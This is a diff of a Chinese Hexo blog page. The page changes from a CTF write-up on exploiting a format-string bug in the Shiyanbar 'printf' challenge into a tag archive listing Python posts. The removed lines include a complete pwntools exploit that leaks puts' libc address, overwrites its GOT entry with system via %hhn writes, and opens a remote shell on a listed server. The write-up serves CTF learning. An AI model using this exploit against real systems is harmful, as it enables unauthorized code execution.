@@ -6,27 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>格式化字符串漏洞利用 | 怪咖的小屋</title>
+  <title>Tag: python | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)使用objdump得到">
-<meta name="keywords" content="pwn,格式化字符串">
-<meta property="og:type" content="article">
-<meta property="og:title" content="格式化字符串漏洞利用">
-<meta property="og:url" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="怪咖的小屋">
+<meta property="og:url" content="http://yoursite.com/tags/python/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
-<meta property="og:description" content="格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)使用objdump得到">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/79076a875c0be0f6d97d4c473253830b.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/12f365ca9d4c0974c5c199fc01c77ad1.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/3b2274e6c5035e053d8ae71843504655.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/3e106ca9b4c77a52be5e124bc8b9a7b2.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/1f07ab3fcea14d0a0bd825f8e810efb4.png">
-<meta property="og:updated_time" content="2019-09-10T10:03:05.557Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="格式化字符串漏洞利用">
-<meta name="twitter:description" content="格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)使用objdump得到">
-<meta name="twitter:image" content="http://yoursite.com/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png">
+<meta name="twitter:title" content="怪咖的小屋">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -158,192 +146,326 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-格式化字符串漏洞利用" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      格式化字符串漏洞利用
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Python binascii模块/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Python binascii模块/">Python binascii模块</a>
     </h1>
   
 
-        
-        <a href="/2019/09/10/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h3><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
-<ol>
-<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
-<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
-<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/格式化字符串漏洞利用/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
-</ol>
-<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
-<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
-<p><strong>exp</strong>如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">puts_file</span><span class="params">(io,  name,content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'put'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'upload:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">get_file</span><span class="params">(io,  name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'get'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'get:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">dir_file</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'dir'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'Start!'</span></span><br><span class="line">    fake_username  =  <span class="string">'sysbdmin'</span></span><br><span class="line">    real_username  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#计算出真实的用户名</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  fake_username:</span><br><span class="line">        real_username  +=  chr(ord(i)  -  <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Name (ftp.hacker.server:Rainism):'</span>)</span><br><span class="line">    io.sendline(real_username)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] real_username : '</span>,real_username</span><br><span class="line">    <span class="comment">#得到puts的got表地址</span></span><br><span class="line">    got_puts  =  <span class="number">0x0804a028</span></span><br><span class="line">    <span class="comment">#得到puts的偏移量</span></span><br><span class="line">    offset_puts  =  <span class="number">0x5fca0</span></span><br><span class="line">    content  =  p32(got_puts)  +  <span class="string">'%7$s...'</span></span><br><span class="line">    <span class="comment">#构造之后system调用的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/sh'</span></span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="comment">#利用printf的格式化字符串漏洞打印出真实的puts地址</span></span><br><span class="line">    data  =  io.recvuntil(<span class="string">'...'</span>)[<span class="number">0</span>:]</span><br><span class="line">    addr_puts  =  u32(data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_puts: '</span>,hex(addr_puts)</span><br><span class="line">    <span class="comment">#计算libc的基址</span></span><br><span class="line">    addr_libc  =  addr_puts  -  offset_puts</span><br><span class="line">    offset_system  =  <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment">#计算system的真实地址</span></span><br><span class="line">    addr_system  =  addr_libc  +  offset_system</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system: '</span>,hex(addr_system)</span><br><span class="line"></span><br><span class="line">    addr_info  =  <span class="string">''</span></span><br><span class="line">    padding_info  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#覆盖puts的got表地址</span></span><br><span class="line">    system_addr_buff  =  p32(addr_system)</span><br><span class="line">    begin_index  =  <span class="number">7</span></span><br><span class="line">    offset  =  <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  range(<span class="number">4</span>):</span><br><span class="line">        addr_info  +=  p32(got_puts  +  i)</span><br><span class="line">        val  =  ord(system_addr_buff[i])</span><br><span class="line">        count  =  val  -  offset</span><br><span class="line">        <span class="keyword">if</span>  count  &lt;  <span class="number">0</span>  :</span><br><span class="line">            count  +=  <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        padding_info  +=  <span class="string">'%%%dc'</span>  %  count  +  <span class="string">'%%%d$hhn'</span>  %  (begin_index  +  i)</span><br><span class="line"></span><br><span class="line">        offset  =  val</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start Attacking!'</span></span><br><span class="line">    <span class="comment">#与之前创建的文件名组成了system的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/bin'</span></span><br><span class="line">    content  =  addr_info  +  padding_info</span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] puts_file succeed!'</span></span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] get_file succeed!'</span></span><br><span class="line">    dir_file(io)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] dir_file succeed!'</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    io  =  remote(<span class="string">'106.2.25.7'</span>,<span class="number">8001</span>)</span><br><span class="line">    pwn(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p><strong>运行结果</strong>如下：<br><img src="/2019/09/10/格式化字符串漏洞利用/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="./assets/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn,格式化字符串</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/格式化字符串漏洞利用/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
   
-<nav id="article-nav">
-  
-    <a href="/2019/09/10/简单栈溢出/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          简单栈溢出
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2019/09/10/输入表重建工具ImportREC/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">输入表重建工具ImportREC</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Python z3-solver/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
+    	 
   
-  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Python z3-solver/">Python z3-solver</a>
+    </h1>
   
 
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Python 邮件编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Python 邮件编程/">Python 邮件编程</a>
+    </h1>
   
 
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/PythonHash/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/PythonHash/">PythonHash</a>
+    </h1>
   
 
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
   
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/PythonPIL简单编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/PythonPIL简单编程/">PythonPIL简单编程</a>
+    </h1>
+  
+
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Pythonpexpect/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Pythonpexpect/">Pythonpexpect</a>
+    </h1>
+  
+
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Python字符串开头b r u含义/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Python字符串开头b r u含义/">Python字符串开头b r u含义</a>
+    </h1>
+  
+
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2019/09/10/Python网络编程/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/09/10/Python网络编程/">Python网络编程</a>
+    </h1>
+  
+
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+  
+    </div></section>
+  
+
+    
 
 
           </div>
@@ -366,9 +488,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
